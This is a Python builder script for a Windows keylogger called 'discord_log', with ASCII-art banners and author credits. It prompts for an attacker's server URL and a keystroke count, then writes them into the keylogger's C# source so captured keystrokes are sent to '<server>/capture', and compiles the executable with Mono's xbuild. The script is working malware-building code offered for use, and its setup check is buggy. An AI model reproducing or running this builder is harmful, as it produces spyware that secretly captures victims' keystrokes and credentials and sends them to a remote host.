# -*- coding: utf-8 -*-
# author: script1337 
import os

os.system("cls")
banner = """


    .___.__                              .___    ____  ___.__                 
  __| _/|__| ______ ____  ___________  __| _/    \   \/  /|  |   ____   ____  
 / __ | |  |/  ___// ___\/  _ \_  __ \/ __ |      \     / |  |  /  _ \ / ___\ 
/ /_/ | |  |\___ \\\\  \__(  <_> )  | \/ /_/ |      /     \ |  |_(  <_> ) /_/  >
\____ | |__/____  >\___  >____/|__|  \____ |_____/___/\  \|____/\____/\___  / 
     \/         \/     \/                 \/_____/     \_/           /_____/  

                                                        coded by script1337
                                     Github : https://github.com/ScRiPt1337
                                         Contact me here : script1337X#4774
                                         
                                         
                                         
"""

bat = """
cd C:\\Program Files\\Mono\\bin\\
xbuild.bat {cwd}\\discord_log\\discord_log.sln
""".format(cwd=os.getcwd())

Warning = """
                                                                                       
                                          L.                 L.                        
                               j.         EW:        ,ft t   EW:        ,ft         .Gt
           ;                .. EW,        E##;       t#E Ej  E##;       t#E        j#W:
         .DL               ;W, E##j       E###t      t#E E#, E###t      t#E      ;K#f  
 f.     :K#L     LWL      j##, E###D.     E#fE#f     t#E E#t E#fE#f     t#E    .G#D.   
 EW:   ;W##L   .E#f      G###, E#jG#W;    E#t D#G    t#E E#t E#t D#G    t#E   j#K;     
 E#t  t#KE#L  ,W#;     :E####, E#t t##f   E#t  f#E.  t#E E#t E#t  f#E.  t#E ,K#f   ,GD;
 E#t f#D.L#L t#K:     ;W#DG##, E#t  :K#E: E#t   t#K: t#E E#t E#t   t#K: t#E  j#Wi   E#t
 E#jG#f  L#LL#G      j###DW##, E#KDDDD###iE#t    ;#W,t#E E#t E#t    ;#W,t#E   .G#D: E#t
 E###;   L###j      G##i,,G##, E#f,t#Wi,,,E#t     :K#D#E E#t E#t     :K#D#E     ,K#fK#t
 E#K:    L#W;     :K#K:   L##, E#t  ;#W:  E#t      .E##E E#t E#t      .E##E       j###t
 EG      LE.     ;##D.    L##, DWi   ,KK: ..         G#E E#t ..         G#E        .G#t
 ;       ;@      ,,,      .,,                         fE ,;.             fE          ;;
                                                       ,                  ,            
"""
print(banner)
server = input("Enter your server url here# ")
count = input("Enter the how much keystrokes you want at a time# ")

def setup():
    check = os.path.isdir("C:\\Program Files\\Mono")
    if check():
        print("Everythink looking good!!!")
    else:
        print(Warning)
        print("Please Download mono from here : https://www.mono-project.com/download/stable/ 64bit then Run this script!")
               
        
def replace_line(file_name, line_num, text):
    lines = open(file_name, 'r').readlines()
    lines[line_num] = text
    out = open(file_name, 'w')
    out.writelines(lines)
    out.close()

def build_the_fucking_keylogger():
    global server,count
    file_to_write = os.getcwd()+"\discord_log\discord_log\Program.cs"
    first = "    static string server = \""+server+"/capture\";\n"
    second_write = "            if (logs.Count() == "+count+")\n"
    replace_line(file_to_write,22,first)
    replace_line(file_to_write,142,second_write)
    with open('build.bat', 'w') as filehandle:
        filehandle.write(bat)
    os.system("build.bat")
    os.system("move " + os.getcwd()+"\\discord_log\\discord_log\\bin\\Debug\\discord_log.exe "+os.getcwd()+"\discord_log.exe")
    print("build successfull")
    
build_the_fucking_keylogger()